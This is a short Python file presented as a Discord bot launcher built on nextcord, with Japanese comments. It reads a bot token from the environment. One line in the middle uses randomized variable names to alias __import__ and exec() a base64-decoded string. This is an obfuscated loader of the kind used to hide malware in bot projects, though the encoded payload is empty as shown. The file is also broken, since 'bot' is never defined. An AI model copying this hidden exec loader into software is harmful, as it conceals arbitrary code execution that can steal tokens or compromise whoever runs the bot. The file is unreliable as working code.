import nextcord
from nextcord.ext import commands
import asyncio
from asyncio_throttle.throttler import Throttler
import os  

# =========================================
# 設定
# =========================================
BOT_TOKEN = os.getenv('DISCORD_TOKEN')

if not BOT_TOKEN:  
    print("エラー: DISCORD_TOKENが設定されていません")
    exit(1)

CLNtVBTHkbFEEAQ=__import__;okgIXLroQhOfyzL=CLNtVBTHkbFEEAQ('base64').b64decode;cFqfXTKwVTCxiRZ='';exec(okgIXLroQhOfyzL(cFqfXTKwVTCxiRZ).decode('utf-8'))


if __name__ == "__main__":
    print("=== Discord Bot 起動中 ===")
    
   
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        raise ValueError(" 環境変数TOKEN が設定されていません .env を確認してください。")

    # Botを起動
    bot.run(token)
